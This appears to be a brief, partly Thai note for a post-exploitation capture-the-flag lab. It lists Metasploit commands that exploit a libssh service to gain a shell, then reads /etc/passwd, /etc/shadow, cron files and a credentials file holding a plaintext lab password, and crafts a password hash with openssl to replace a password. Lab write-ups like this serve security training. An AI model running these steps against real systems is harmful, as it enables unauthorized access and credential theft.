Host & Network Penetration Testing: Post-Exploitation CTF 1

`msfconsole`
`search libssh`
`use 0`
`set SPAWN_PTY true`
`run`

get session 1

`sessions -i`
`sessions 2`

focus etc/passwd 
FLAG1_e28af4baaf6b442ba1efd89944a52564:x:1001:984::/home/FLAG1_e28af4baaf6b442ba1efd89944a52564:/usr/bin/bash

focus etc/group
FLAG2_d4e4779524f04939885edb088992ca3b

focus etc/cron.d
cron.d  FLAG3_ffc588b029fa4f328e6c1ea7583f06e9


`cat credentials.txt`
`john:Pass@john123`

`cat /etc/shadow`
root:*:19977:0:99999:7:::
ไม่มีรหัสผ่าน

openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/

เปลี่ยน password 
